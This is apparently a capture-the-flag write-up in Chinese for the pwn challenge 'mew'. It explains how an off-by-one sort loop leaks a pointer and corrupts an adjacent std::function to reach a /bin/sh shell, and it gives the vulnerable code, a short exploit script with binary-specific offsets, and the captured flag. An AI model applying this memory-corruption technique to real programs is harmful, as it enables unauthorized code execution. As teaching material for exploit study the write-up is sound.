# mew

## 题目简述

程序维护一个包含 100 个 `unsigned long long` 的全局数组，并提供读写、排序和计算运行平均值等功能。排序函数错误地使用 `i <= len`、`j <= len`，调用时又传入 `len=100`，因此会访问数组外的 `ARR[100]`。

全局数组之后紧邻 `std::function<int(int)> running_mean` 的内部数据。越界排序可以把该对象中的指针交换进数组用于泄露，也能把攻击者数值交换回对象，最终劫持 `std::function` 调用路径。

## 解题过程

漏洞位置为：

```cpp
for (num i = 0; i <= len; i++) {
    for (num j = i; j <= len; j++) {
        if (arr[i] < arr[j]) continue;
        std::swap(arr[i], arr[j]);
    }
}
```

官方脚本先在 `ARR[99]` 写入 $2^{64}-1$ 并排序，使原本位于越界槽 `ARR[100]` 的 `running_mean` 指针被交换到可读的 `ARR[99]`，从而获得地址泄露。随后重新初始化 `running_mean`，按官方二进制中测得的相对偏移计算目标指针，再利用第二次排序把它交换回 `ARR[100]`。

核心交互如下，偏移只对题目附带构建有效：

```python
write(99, 2**64 - 1)
sort()
sum_ptr = read(99)

target = sum_ptr + 0x60
reinit_running_mean()
write(99, target)
sort()

# 修正调用路径中的固定代码偏移
write(99, 0x13ec + 5 - 0x187b)
statistics()
```

调用 `statistics()` 时，程序遍历数组并执行被破坏的 `running_mean`，最终转入 `win()` 中的 `system("/bin/sh")`。进入 Shell 后读取：

```text
greyhats{mewtwo_19211231}
```

## 方法总结

- 核心技巧：利用排序循环的 off-by-one 访问相邻全局 C++ 对象，先泄露指针再破坏 `std::function` 的调用状态。
- 识别信号：数组长度为 100，却循环到 `<= 100`；数组旁边存在后续会被调用的复杂函数对象。
- 复用要点：C++ 标准库对象布局和偏移与编译器/构建强相关，必须以题目二进制实测；源码层只负责确认越界原语。
